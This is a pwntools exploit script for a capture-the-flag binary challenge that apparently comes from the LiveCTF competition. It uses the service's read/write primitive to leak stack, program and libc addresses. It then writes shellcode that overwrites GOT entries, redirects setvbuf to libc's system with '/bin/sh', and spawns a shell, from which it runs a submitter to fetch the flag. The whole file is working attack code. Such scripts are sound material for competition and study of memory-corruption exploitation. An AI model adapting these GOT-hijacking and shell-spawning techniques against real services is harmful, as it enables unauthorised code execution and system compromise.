from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))

context.log_level = 'DEBUG'
context.arch = 'amd64'

def read(addr):
    p.recvuntil(b"Choice: ")
    p.sendline(b"1")
    p.recvuntil(b"Address: ")
    p.sendline(hex(addr).encode())
    p.recvuntil(b"Value: ")
    return int(p.recvline().strip(), 16)

def write(addr, value):
    p.recvuntil(b"Choice: ")
    p.sendline(b"2")
    p.recvuntil(b"Value: ")
    p.sendline(hex(value).encode())
    p.recvuntil(b"Address: ")
    p.sendline(hex(addr).encode())


# p = process('./challenge')
e = ELF('./challenge')
libc = ELF("./libc.so.6")

stack = read(0xdeadbeef)

log.info("stack: "+hex(stack))

codebase = read(stack - 0x20) - 0x1285
libcbase = read(stack - 0x70) - 0x29e40

log.info("codebase: "+hex(codebase))
log.info("libcbase: "+hex(libcbase))

usleep = codebase + e.got['usleep']
target = codebase + e.sym['init']
puts = codebase + e.got['kill']

print (hex(usleep))
print (hex(target))

def make(addr, val):
    pay = shellcraft.amd64.getppid()
    pay += 'mov rdi, rax\n'
    pay += 'mov rsi, ' + hex(addr) + '\n'
    pay += 'mov rax, ' + hex(codebase + 0x1500) + '\n'
    pay += 'mov rdx, ' + hex(val) + '\n'
    pay += 'call rax'
    return pay

payload = b""
payload += asm(make(codebase + e.got['kill'], codebase + e.sym['init']))
payload += asm(make(codebase + e.got['setvbuf'], libcbase + libc.sym['system']))
payload += asm(make(codebase + 0x35a0, u64(b"/bin/sh\x00")))
payload += asm(make(codebase + 0x3590, codebase + 0x35a0))

print(payload)
print(len(payload))

for i in range(len(payload)//8):
    write(target+i*8, int.from_bytes(payload[i*8:i*8+8], byteorder='little'))

write(usleep, target)

p.sendlineafter(b": ", b"3")
p.sendline(b"./submitter")

flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)